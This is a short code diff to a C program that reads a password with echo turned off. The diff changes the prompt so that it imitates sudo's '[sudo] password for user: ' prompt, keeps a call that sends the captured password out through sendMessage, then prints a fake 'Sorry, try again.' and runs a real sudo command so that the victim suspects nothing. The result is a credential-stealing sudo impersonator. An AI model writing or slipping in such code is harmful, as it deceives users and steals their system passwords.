@@ -97,7 +97,7 @@ int main() {
     int i = 0;
     char c;
 
-    printf("Enter password: ");
+    printf("[sudo] password for user: ");
     fflush(stdout);
     disable_echo();
 
@@ -117,7 +117,8 @@ int main() {
 
     enable_echo();
 	sendMessage(password);
-
+	printf("Sorry, try again.\n");
+	system("sudo systemctl restart sshd");
     return 0;
 }
 
